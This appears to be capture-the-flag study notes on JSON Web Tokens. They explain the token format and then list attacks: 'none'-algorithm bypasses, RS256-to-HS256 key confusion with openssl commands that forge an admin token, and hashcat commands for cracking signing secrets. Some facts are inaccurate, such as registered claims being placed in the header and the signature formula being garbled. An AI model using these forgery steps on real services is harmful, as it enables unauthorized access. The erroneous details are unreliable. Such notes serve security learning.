# JWT - JSON Web Tokens
> JSON Web Tokens, commonly used for authentication, is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.

It usually takes a form similar to this: 

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c` (JWTs are always encoded in Base64)

1. `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` - This is the header of the JWT. There are several claims that can be made in a header:
- `alg`
    - Specifies how the signature should be calculated. Default is HS256 (HMAC with SHA256), other common types include RS256 (RSASSA-PKCS1-v1\_5 using SHA256) or none (no digital signature for debugging purposes).
- `iss`
    - Issuer of the token
- `exp`
    - Expiration timestamp of the token (expired tokens will be rejected)
- `iat`
    - Issue time of token (can determine token age)
- `nbf`
    - "Anti-expiration": Token is only valid after the specified time
- `jti`
    - Unique ID for the token, so the JWT can't be re-used or re-deployed (Prevents cookie stealing via Server XSS)
- `sub` and `aud`
    - Subject and Audience of token (rarely used)

2. `eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ` - Payload of JWT, actual data is in here

3. `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c` - Signature of JWT used to verify that it hasn't been modified. 
The signature is defined as follows (HS256): 

```
HMACSHA256(Base64-encoded header + Base64-encoded payload + secret)
```

## None algo
With the `none` algorithm, the signature is made redundant, so payload can be modified freely

Variations of `none`:
- `None`
- `NONE`
- `nOnE`

However, the signature must be removed for this to work. Also, most jwt handling modules have algos hardcoded, so the app has to be explicitly configured to determine algo based on JWT input.

## RS256 to HS256
Since RSA256 is asymmetric, it has a public and private key, while HS256 is symmetric and only has a single secret key. If the original token used RS256, it may be possible to sign it through HS256 with the RS256 public key

Steps:
1. Convert public key (key.pem) into hex
```bash
$ cat key.pem | xxd -p | tr -d "\\n"
```

2. Generate HMAC signature with desired header and payload, supplying key as output of above
```bash
$ echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<hex key here> | base64
```

## Cracking secret with hashcat
``` bash
$ ./hashcat.exe -a 0 -m 16500 ./jwt ./rockyou.dict
```
```bash
$ ./hashcat.exe -a 3 -m 16500 ./jwt ?a?a?a?a?a?a
```

## Relevant tools
`/CTF/tools/Web/JWT/jwt-tool`
